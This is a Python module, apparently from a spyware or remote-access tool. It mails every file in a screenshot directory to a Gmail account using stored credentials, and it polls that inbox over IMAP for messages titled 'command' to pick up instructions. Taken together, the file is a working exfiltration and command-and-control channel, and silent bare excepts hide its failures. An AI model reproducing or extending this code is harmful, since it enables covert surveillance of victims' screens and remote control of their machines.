# Date: 01/28/2019
# Author: Mohamed
# Description: Send an email

import email
import smtplib
import imaplib
from email import encoders
from os import listdir, path 
from .const import GmailConst
from .const import ScreenConst
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from socket import gaierror as ConnectionError


class Email:

    def __init__(self, email, password):
        self.email = email 
        self.password = password 
        self.img =  ScreenConst.IMG.value 
        
        self.smtp_port = GmailConst.SMTP_PORT.value
        self.imap_server = GmailConst.IMAP_SERVER.value 
        self.smtp_server = GmailConst.SMTP_SERVER.value

    def read_img(self, img):    
        with open(img, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(img))
        return part 
    
    def format_email(self, subject, header, data):
        msg = MIMEMultipart()
        text = MIMEText(data, 'plain')
        header = MIMEText(header, 'html')

        msg['Subject'] = subject
        msg['From'] = self.email
        msg['To'] = self.email   
        msg.attach(header)
        msg.attach(text)

        for img in listdir(ScreenConst.DIR.value):
            img = self.read_img(path.join(ScreenConst.DIR.value, img))
            msg.attach(img)

        return msg.as_string()
    
    def send(self, subject, header, data):
        try:
            server = smtplib.SMTP(self.smtp_server)
            server.connect(self.smtp_server, self.smtp_port)

            server.starttls()
            server.login(self.email, self.password)

            server.sendmail(self.email, self.email, self.format_email(subject, header, data))
            server.quit()
        except smtplib.SMTPAuthenticationError:
            print('Error: Failed to login')

        except ConnectionError:
            print('Error: Unable to access Gmail')
            
        except:
            pass
    
    def recv(self):
        try:
            mail = imaplib.IMAP4_SSL(self.imap_server)
            mail.login(self.email, self.password)

            mail.select('inbox')
            
            data = mail.search(None, 'FROM "me"')
            data = mail.fetch(data[1][0].split()[-1], '(RFC822)')

            msg = email.message_from_string(data[1][0][1].decode())
            subject = msg['subject']                                
                
            if subject.lower().strip() == 'command':
                return msg.get_payload()[0].get_payload(decode=True).decode().split()[0].lower()
        except:
            pass 